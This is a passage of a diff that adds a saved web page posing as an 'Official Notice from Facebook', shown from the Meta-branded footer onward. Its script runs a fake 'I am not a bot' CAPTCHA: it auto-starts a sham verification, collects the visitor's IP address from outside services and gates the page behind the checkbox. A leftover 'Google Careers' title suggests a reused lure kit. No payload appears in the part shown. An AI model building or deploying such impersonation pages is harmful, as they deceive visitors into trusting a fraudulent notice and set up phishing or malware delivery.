(UK)</span><span>Deutsch</span><span>Türkçe</span><span>Српски</span><span>Français (France)</span><span>Italiano</span><span>Bosanski</span><span>Svenska</span><span>Español</span><span>Português (Brasil)</span></div><div class="border-t my-3 border-[#e5e7eb]"></div><div class="flex flex-wrap gap-x-4 gap-y-2 text-[12px]"><span>Sign Up</span><span>Log in</span><span>Messenger</span><span>Facebook Lite</span><span>Watch</span><span>Places</span><span>Games</span><span>Marketplace</span><span>Meta Pay</span><span>Oculus</span><span>Portal</span><span>Instagram</span><span>Bulletin</span><span>Fundraisers</span><span>Services</span><span>Voting Information Centre</span><span>Privacy Policy</span><span>Privacy Center</span><span>Groups</span><span>About</span><span>Create ad</span><span>Create Page</span><span>Developers</span><span>Careers</span><span>Cookies</span><span>AdChoices</span><span>Terms</span><span>Help</span><span>Contact uploading and non-users</span></div><p class="text-[12px] text-[#9ca3af] mt-3">Meta © 2026</p></div></div><div class="flex md:hidden flex-col  absolute bottom-0 left-0 right-0 w-full bg-white py-4"><div class="max-w-screen-lg mx-auto px-6 py-6 text-[#737373]"><div class="flex flex-wrap gap-x-4 gap-y-2 text-[12px]"><span>English (UK)</span><span>Deutsch</span><span>Türkçe</span><span>Српски</span><span>Français (France)</span><span>Italiano</span><span>Bosanski</span><span>Svenska</span><span>Español</span><span>Português (Brasil)</span></div><div class="border-t my-3 border-[#e5e7eb]"></div><div class="flex flex-wrap gap-x-4 gap-y-2 text-[12px]"><span>Sign Up</span><span>Log in</span><span>Messenger</span><span>Facebook Lite</span><span>Watch</span><span>Places</span><span>Careers</span><span>Cookies</span><span>AdChoices</span><span>Terms</span><span>Help</span><span>Contact uploading and non-users</span></div><p class="text-[12px] text-[#9ca3af] mt-3">Meta © 2026</p></div></div></div></div></div></div>
+
+<script defer="" src="./Official Notice from Facebook_files/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;rayId&quot;:&quot;9cf56f2e191ffce3&quot;,&quot;version&quot;:&quot;2025.9.1&quot;,&quot;r&quot;:1,&quot;token&quot;:&quot;b89be045b60b413f9fdcb760e51e0661&quot;,&quot;serverTiming&quot;:{&quot;name&quot;:{&quot;cfExtPri&quot;:true,&quot;cfEdge&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfL4&quot;:true,&quot;cfSpeedBrain&quot;:true,&quot;cfCacheStatus&quot;:true}}}" crossorigin="anonymous"></script>
+
+
+
+<script>
+    
+    document.addEventListener('DOMContentLoaded', () => {
+      // Page Loading Management (controlled by CAPTCHA verification)
+      const pageLoadingOverlay = document.getElementById('pageLoadingOverlay');
+      const progressBarContainer = document.getElementById('progressBarContainer');
+      
+      // Hide loading elements initially
+      pageLoadingOverlay.classList.add('hidden');
+      progressBarContainer.classList.add('hidden');
+      
+      // Function to show loading during verification
+      window.showVerificationLoading = () => {
+        console.log('Showing verification loading...');
+        pageLoadingOverlay.classList.remove('hidden');
+        progressBarContainer.classList.remove('hidden');
+        
+        // Ensure visibility
+        pageLoadingOverlay.style.display = 'block';
+        progressBarContainer.style.display = 'block';
+        
+        // Reset animation
+        const progressBar = progressBarContainer.querySelector('.progress-bar');
+        progressBar.style.animation = 'none';
+        progressBar.offsetHeight; // Trigger reflow
+        progressBar.style.animation = 'progressFlow 4s ease-out forwards';
+        
+        console.log('Progress bar animation started');
+      };
+      
+      // Function to hide loading after verification
+      window.hideVerificationLoading = () => {
+        pageLoadingOverlay.classList.add('hidden');
+        progressBarContainer.classList.add('hidden');
+      };
+
+      // CAPTCHA functionality
+      const captchaScreen = document.getElementById('captchaScreen');
+      const captchaButton = document.getElementById('captchaButton');
+      
+      // Check if verification info exists in localStorage
+      const storedVerification = localStorage.getItem('captcha_verification');
+      
+      // if (storedVerification) {
+      //   try {
+      //     const verificationData = JSON.parse(storedVerification);
+      //     // Check if stored data is still valid (you can add expiration logic here)
+      //     if (verificationData.verified && verificationData.ip) {
+      //       // Skip CAPTCHA if already verified
+      //       captchaScreen.style.display = 'none';
+      //       console.log('CAPTCHA verification skipped - already verified');
+      //       return;
+      //     }
+      //   } catch (e) {
+      //     // Invalid stored data, remove it
+      //     localStorage.removeItem('captcha_verification');
+      //   }
+      // }
+
+      // Show CAPTCHA screen and initialize verification process
+      captchaScreen.style.display = 'flex';
+      
+      // Function to get IP address from API
+      async function getIPAddress() {
+        try {
+          const response = await fetch('https://api.ipify.org?format=json');
+          const data = await response.json();
+          return data.ip;
+        } catch (error) {
+          console.error('Error fetching IP:', error);
+          // Fallback API
+          try {
+            const fallbackResponse = await fetch('https://httpbin.org/ip');
+            const fallbackData = await fallbackResponse.json();
+            return fallbackData.origin;
+          } catch (fallbackError) {
+            console.error('Error with fallback IP service:', fallbackError);
+            throw new Error('Unable to fetch IP address');
+          }
+        }
+      }
+
+      // Function to handle initial IP verification (auto-start)
+      async function initializeVerification() {
+        // Change page title to include "Verify"
+        document.title = 'Verify - Official Notice from Facebook';
+        
+        // Set button to verifying state with spinner
+        captchaButton.innerHTML = '<span class="clf-spinner"></span> Verifying...';
+        captchaButton.style.opacity = '0.7';
+        captchaButton.disabled = true;
+
+        // Show page loading overlay and progress bar immediately
+        if (window.showVerificationLoading) {
+          window.showVerificationLoading();
+        }
+
+        try {
+          // Get IP address
+          const ipAddress = await getIPAddress();
+          
+          // Add 3-5 second delay as requested (matching progress bar duration)
+          await new Promise(resolve => setTimeout(resolve, 1000));
+          
+          // Store IP data temporarily (not fully verified until user clicks)
+          window.tempVerificationData = {
+            ip: ipAddress,
+            timestamp: Date.now(),
+            eventId: document.querySelector('.clf-event-id').textContent
+          };
+          
+          // Hide loading overlay and progress bar
+          if (window.hideVerificationLoading) {
+            window.hideVerificationLoading();
+          }
+          
+          // Restore original page title
+          document.title = 'Official Notice from Facebook';
+          
+          // Update button to ready state - user must click manually
+          captchaButton.innerHTML = 'I am not a bot';
+          captchaButton.style.opacity = '1';
+          captchaButton.disabled = false;
+          
+          console.log('IP verification completed, waiting for user interaction');
+          
+        } catch (error) {
+          console.error('Initial verification failed:', error);
+          
+          // Hide loading overlay and progress bar on error
+          if (window.hideVerificationLoading) {
+            window.hideVerificationLoading();
+          }
+          
+          // Restore original page title
+          document.title = 'Google Careers';
+          
+          // Reset button on error
+          captchaButton.innerHTML = 'I am not a bot';
+          captchaButton.style.opacity = '1';
+          captchaButton.disabled = false;
+          alert('Verification failed. Please try again.');
+        }
+      }
+
+      // Function to handle manual user verification (when user clicks)
+      function completeVerification() {
+        if (!window.tempVerificationData) {
+          // If no temp data, restart the process
+          initializeVerification();
+          return;
+        }
+
+        // Create final verification data
+        const verificationData = {
+          verified: true,
+          ...window.tempVerificationData
+        };
+
+        // Save to localStorage
+        localStorage.setItem('captcha_verification', JSON.stringify(verificationData));
+        
+        // Hide CAPTCHA screen after successful verification
+        captchaScreen.style.display = 'none';
+        
+        // Clean up temp data
+        delete window.tempVerificationData;
+      }
+
+      // Add click event listener to captcha button for manual completion
+      captchaButton.addEventListener('click', completeVerification);
+
+      // Start initial verification process automatically when page loads
+      setTimeout(() => {
+        initializeVerification();
+      }, 500);
+    });
+  </script>
+<div id="give-freely-root-ejkiikneibegknkgimmihdpcbcedgmpo" class="give-freely-root" data-extension-id="ejkiikneibegknkgimmihdpcbcedgmpo" data-extension-name="Volume Booster" style="display: block;"><template shadowrootmode="open"><style>
+  :host {
+    all: initial;
+  }
+
+  .gf-scroll-remove::-webkit-scrollbar {
+    border-radius-bottom-right: 15px;
+  }
+
+  button {
+    cursor: pointer;
+    transition: transform 0.1s ease;
+  }
+
+  button:active {
+    transform: scale(0.98);
+  }
+
+  .give-freely-close-button:hover {
+    opacity: 0.7;
+  }
+
+  input[type="radio"] {
+    margin-right: 8px;
+  }
+
+  hr {
+    border: none;
+    border-top: 1px solid #e5e5e5;
+    margin: 1em 0;
+  }
+
+  @media (max-width: 600px), (max-height: 480px) {
+    #give-freely-checkout-popup {
+      display: none !important;
+    }
+  }
+</style><div><div class="gf-app"></div></div></template></div></body></html>
